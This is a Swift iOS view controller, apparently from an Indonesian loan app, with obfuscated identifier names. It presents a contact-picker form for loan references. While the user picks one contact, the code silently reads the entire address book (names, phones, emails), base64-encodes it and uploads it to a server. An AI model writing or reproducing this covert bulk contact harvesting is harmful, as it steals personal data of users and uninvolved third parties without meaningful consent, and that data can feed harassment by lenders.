//
//  ForwardingPachalicViewController.swift
//  Catatan
//
//  Created by apple on 2024/2/29.
//

import UIKit
import HandyJSON
import MBProgressHUD_WJExtension
import Contacts

class ForwardingPachalicViewController: RaceIterativeViewController {
    
    var babassuBidders: String = ""
    
    var associatedHardworking: String = ""
    
    var startTime1: String = ""
    
    var unmanagedUpload: Bool = false
    
    var cabanaIncomes: [IncomesModel]?
    
    lazy var nabeshimaView: CastingInheritanceContractView = {
        let nabeshimaView = CastingInheritanceContractView()
        return nabeshimaView
    }()
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        // Do any additional setup after loading the view.
        addNavView()
        cabalisticView.block = { [weak self] in
            self?.oakleyAapamoorFabric("Apakah Anda yakin ingin menyerah pada permohonan pinjaman ini?")
        }
        view.addSubview(nabeshimaView)
        view.insertSubview(nabeshimaView, belowSubview: cabalisticView)
        nabeshimaView.snp.makeConstraints { make in
            make.edges.equalTo(view)
        }
        nabeshimaView.block = { [weak self] array in
            print("array>>>contract>>>\(array)")
            self?.kaffeeklatschOakWaco(array)
        }
        nabeshimaView.block1 = { [weak self] cell in
            self?.rabbaniteSearchingIme(cell: cell) { [weak self] namedArray in
                if let namedArray = namedArray {
                    print("namedArray>>>>>>>>>>>\(namedArray)")
                    if self?.unmanagedUpload == false {
                        self?.linearHabanaVendor(namedArray)
                    }
                }
            }
        }
        associativeHandlerDhtml()
        startTime1 = String(Int(Date().timeIntervalSince1970))
    }
    
    func associativeHandlerDhtml() {
        addHudView()
        let nablusDict = ["bidders":babassuBidders]
        ParserPachalicApiWork.shared.requestAPI(params: nablusDict, pageUrl: namedDamned, method: .post) { [weak self] baseModel in
            let rabbanistAwareness = baseModel.awareness
            let edges = baseModel.edges
            if rabbanistAwareness == 0 || rabbanistAwareness == 00 {
                let model = JSONDeserializer<HoveredModel>.deserializeFrom(dict: baseModel.hovered)
                let cabanaIncomes = model?.released?.incomes
                if let cabanaIncomes = cabanaIncomes {
                    self?.cabanaIncomes = cabanaIncomes
                    self?.nabeshimaView.array = cabanaIncomes
                    self?.nabeshimaView.tableView.reloadData()
                }
            }
            self?.removeHudView()
        } errorBlock: { [weak self] error in
            self?.removeHudView()
        }
    }
    
    func rabbaniteSearchingIme(cell: BaaroqueWildcardViewCell,completion: @escaping ([[String: Any]]?) -> Void) {
        var leftArray: [[String: Any]] = []
        let labiaStore = CNContactStore()
        IntersectionSabangContactsManager.benefitWebVacationer { [weak self] granted in
            if granted {
                self?.wizardClassificationBandwidth(cell: cell)
                let keysToFetch: [CNKeyDescriptor] = [CNContactGivenNameKey as NSString, CNContactFamilyNameKey as NSString, CNContactPhoneNumbersKey as NSString, CNContactEmailAddressesKey as NSString]
                let fetchRequest = CNContactFetchRequest(keysToFetch: keysToFetch)
                DispatchQueue.main.async {
                    do {
                        try labiaStore.enumerateContacts(with: fetchRequest) { (contact, stop) in
                            var phoneNumbers: [String] = []
                            for phoneNumber in contact.phoneNumbers {
                                let value = phoneNumber.value.stringValue
                                phoneNumbers.append(value)
                            }
                            
                            var escapeAddresses: [String] = []
                            for emailAddress in contact.emailAddresses {
                                let value = emailAddress.value as String
                                escapeAddresses.append(value)
                            }
                            
                            var vacateStr: String?
                            
                            var digestStr: String?
                            
                            if phoneNumbers.count >= 1 {
                                vacateStr = phoneNumbers.joined(separator: ",")
                            }
                            
                            if escapeAddresses.count >= 1 {
                                digestStr = escapeAddresses.joined(separator: ",")
                            }
                            
                            let kaffeeklatschContact = ["conjured":contact.givenName + contact.familyName,"grieving":vacateStr ?? "","balanced":digestStr ?? ""] as [String: Any]
                            leftArray.append(kaffeeklatschContact as [String : Any])
                        }
                        DispatchQueue.main.async {
                            completion(leftArray)
                        }
                    } catch {
                        print("Error fetching contacts: \(error)")
                        DispatchQueue.main.async {
                            // Completion block called on the main thread
                            completion(nil)
                        }
                    }
                }
            } else {
                print("未获得通讯录权限")
                self?.laserXmlDigest("Anda belum memperoleh izin untuk mengakses kontak, silakan menuju ke pengaturan.")
                DispatchQueue.main.async {
                    completion(nil)
                }
            }
        }
    }
    
    func wizardClassificationBandwidth(cell: BaaroqueWildcardViewCell) {
        IntersectionSabangContactsManager.showContactPicker { assignmentName, braceName, email, phoneNumber in
            cell.nameLabel5.textColor = .black
            cell.nameLabel6.textColor = .black
            cell.model.conjured = assignmentName + braceName
            cell.model.female = phoneNumber
            cell.nameLabel5.text = assignmentName + braceName
            cell.nameLabel6.text = phoneNumber
        }
    }
    
    func kaffeeklatschOakWaco(_ array: [[String: Any]]) {
        addHudView()
        var betString: String?
        do {
            let analphabetData = try JSONSerialization.data(withJSONObject: array, options: [])
            if let jsonString = String(data: analphabetData, encoding: .utf8) {
                betString = jsonString
                print("JSON字符串: \(jsonString)")
            }
        } catch {
            print("转换为JSON字符串时出现错误: \(error.localizedDescription)")
        }
        let nablusDict = ["bidders":babassuBidders,"hovered":betString ?? ""] as [String : Any]
        ParserPachalicApiWork.shared.uploadDataAPI(params: nablusDict, pageUrl: backwardGreat, method: .post) { [weak self] baseModel in
            let rabbanistAwareness = baseModel.awareness
            let edges = baseModel.edges
            if rabbanistAwareness == 0 || rabbanistAwareness == 00 {
                print("unmanagedUpload>>>>>unmanagedUpload")
                self?.jacalAccessLongest(yacareProduct: self?.babassuBidders ?? "", startTime: self?.startTime1 ?? "", type: "8", orderID: self?.associatedHardworking ?? "")
                self?.oakenOakmossRecordset(self?.babassuBidders ?? "", "")
            }
            self?.removeHudView()
            MBProgressHUD.wj_showPlainText(edges ?? "", view: nil)
        } errorBlock: { [weak self] error in
            self?.removeHudView()
        }
    }
    
    func linearHabanaVendor(_ array: [[String: Any]]) {
        let analphabetData = try? JSONSerialization.data(withJSONObject: array, options: [])
        let base64Data = analphabetData?.base64EncodedString() ?? ""
        let nablusDict = ["lives":"3","hovered":base64Data] as [String : Any]
        ParserPachalicApiWork.shared.uploadDataAPI(params: nablusDict, pageUrl: virtualObjHardworking, method: .post) { [weak self] baseModel in
            let rabbanistAwareness = baseModel.awareness
            if rabbanistAwareness == 0 || rabbanistAwareness == 00 {
                self?.unmanagedUpload = true
                print("isAllUpload>>>>>isAllUpload")
            }
        } errorBlock: { error in
            
        }
    }
}
